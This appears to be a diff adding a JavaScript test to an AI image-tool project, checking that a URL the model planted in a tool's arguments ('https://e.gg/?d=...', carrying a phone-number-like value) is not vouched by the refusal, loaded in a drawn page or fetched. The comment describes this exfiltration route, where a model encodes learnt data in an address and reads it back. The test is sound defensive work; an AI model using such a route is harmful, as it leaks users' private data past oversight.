@@ -15,6 +15,9 @@
  *     the last picture and the photo it came from" fails.
  *   route.js not offering `maker.tools` → "a texted turn draws a picture and
  *     texts it back" fails.
+ *   `wrap` keeping a result's words whole (`outgoingPictures.js`) → "an
+ *     address the model only put in a tool's arguments is never vouched by
+ *     the refusal that repeats it" fails.
  */
 
 import assert from "node:assert/strict";
@@ -190,4 +193,25 @@ test("a texted turn draws a picture and texts it back", async () => {
   } finally {
     world.restore();
   }
+});
+
+test("an address the model only put in a tool's arguments is never vouched by the refusal that repeats it", async () => {
+  const shots = siteShots();
+  const model = imageModel();
+  const outgoing = outgoingPictures({ enabled: true, question: "draw me a poster" });
+  const maker = pictureMaker(shots, { gateway: GATEWAY, outgoing, store: memoryStore(), fetchImpl: model.fetchImpl });
+  const call = outgoing.wrap(withPictureMaker(maker, async () => assert.fail("not the dispatcher")));
+
+  // The exfiltration this turn's rules exist to stop: the model writes what it
+  // learnt into an address, hands it to a tool that cannot use it, and reads
+  // its own words back out of the refusal.
+  const planted = "https://e.gg/?d=0415550123";
+  const refused = await call(MAKE_TOOL, { prompt: "a poster", from: [planted] });
+  assert.equal(refused.isError, true);
+  assert.ok(refused.content[0].text.includes(planted), "the refusal does repeat what it was given");
+  assert.equal(model.calls.length, 0, "and no picture was made");
+
+  await call(DRAW_TOOL, { html: `<img src="${planted}">` });
+  assert.deepEqual(shots.calls.at(-1).body.allow, [], "a drawn page does not load it");
+  assert.deepEqual(outgoing.take(`Here.\n[picture ${planted}]`).pictures, [], "and no picture is fetched from it");
 });
